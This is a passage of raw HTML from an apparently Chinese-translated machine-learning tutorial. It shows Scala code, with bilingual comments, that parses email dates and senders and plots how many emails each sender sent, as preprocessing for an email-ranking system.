&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;toLowerCase&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-139&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-140&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-141&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-142&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Extract the email address from the tags. &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-143&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//抽取标签中的邮件地址&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-144&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//If these &amp;lt;&amp;gt; tags are there, there is no () with a name in&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-145&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;// the From: string in our data&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-146&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//我们的数据中，如果“From：”字符串存在标签&amp;lt;&amp;gt;，则不会有带()的名字出现&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-147&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;email&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-148&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;substring&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;mailAddressStartIndex&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;mailAddressEndIndex&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-149&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;trim&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-150&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;toLowerCase&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-151&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-152&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-153&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-154&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;def &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getDateFromEmail&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Date&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-155&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Find the index of the Date: line in the complete email&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-156&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//在整封邮件中找出日期行的标志&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-157&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dateLineIndex&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;email&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-158&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;indexOf&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;Date:&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-159&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-160&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;endOfDateLine&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;email&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-161&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;substring&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dateLineIndex&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-162&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;indexOf&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&#39;n&#39;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dateLineIndex&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-163&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-164&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//All possible date patterns in the emails.&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-165&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//邮件中所有可能的日期格式&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-166&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;datePatterns&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;   &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;EEE MMM dd HH:mm:ss yyyy&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-167&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                                &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;EEE, dd MMM yyyy HH:mm&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-168&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                                &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;dd MMM yyyy HH:mm:ss&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-169&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                                &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;EEE MMM dd yyyy HH:mm&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-170&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-171&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;datePatterns&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;foreach&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-172&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Try to directly return a date from the formatting.&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-173&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//尝试用一种日期格式直接返回一个日期&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-174&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//when it fails on a pattern it continues with the next one&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-175&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;// until one works&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-176&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//对于一种格式，当返回错误时，它接着尝试下一种格式直到成功。&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-177&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-178&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;Try&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;SimpleDateFormat&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-179&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;email&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-180&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                            &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;substring&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dateLineIndex&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;endOfDateLine&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-181&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                            &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;trim&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;substring&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-182&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-183&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Finally, if all failed return null&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-184&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//最后，如果都失败了则返回null&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-185&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//(this will not happen with our example data but without &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-186&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//this return the code will not compile)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-187&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//（对于我们的案例数据，这不会发生，但是没有这一返回，代码就不会编译）&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-188&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;null&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-189&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-190&quot;&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0204 seconds] --&gt;
&lt;p&gt;这一数据预处理过程非常普遍，并且，一旦你的数据格式不标准，如带有邮件的日期和发送人，那这个过程将会令人非常纠结。不过，给出了这段代码之后，我们的实例数据现在就有了以下这些可用的属性：完整邮件、接收日期、发送人、主题和正文。有了这些，我们得以确定推荐系统实际要用到的特征。&lt;/p&gt;
&lt;p&gt;我们建议选取的第一个特征来源于邮件的发送人。那些你经常收到 Ta 邮件的人应该排在那些你很少收到 Ta 邮件的人的前面。这是个很有力的假设，但是你应该会本能地认同我们没有考虑垃圾邮件这件事。我们来看看发送人在整个邮件集上的分布。&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b19d061366959184839&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
//Add to the top body:
//添加到主体的顶部

//First we group the emails by Sender, then we extract only the sender address 
//and amount of emails, and finally we sort them on amounts ascending
//首先我们按发送人给邮件分组，然后只抽取发送人的地址以及邮件数，
//最后按邮件数给这些地址按升序排序
val mailsGroupedBySender = trainingData
.groupBy(x =&amp;gt; x.sender)
.map(x =&amp;gt; (x._1, x._2.length))
.toArray
.sortBy(x =&amp;gt; x._2)

//In order to plot the data we split the values from the addresses as 
//this is how the plotting library accepts the data.
//为了将数据绘图，我们将数值与这些地址分离开，因为绘图库只接收这样的数据
val senderDescriptions = mailsGroupedBySender
    .map(x =&amp;gt; x._1)

val senderValues = mailsGroupedBySender
    .map(x =&amp;gt; x._2.toDouble)

val barPlot = BarPlot.plot(&quot;&quot;, senderValues, senderDescriptions)

//Rotate the email addresses by -80 degrees such that we can read them
//将邮件地址旋转80度以方便阅读
barPlot.getAxis(0).setRotation(-1.3962634)
barPlot.setAxisLabel(0, &quot;&quot;)
barPlot.setAxisLabel(1, &quot;Amount of emails received &quot;)
peer.setContentPane(barPlot)

bounds = new Rectangle(800, 600)&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061366959184839-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061366959184839-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061366959184839-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061366959184839-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061366959184839-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061366959184839-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061366959184839-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061366959184839-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061366959184839-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061366959184839-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061366959184839-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061366959184839-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061366959184839-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061366959184839-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061366959184839-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061366959184839-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061366959184839-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061366959184839-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061366959184839-19&quot;&gt;19&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061366959184839-20&quot;&gt;20&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061366959184839-21&quot;&gt;21&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061366959184839-22&quot;&gt;22&lt;/div&gt;
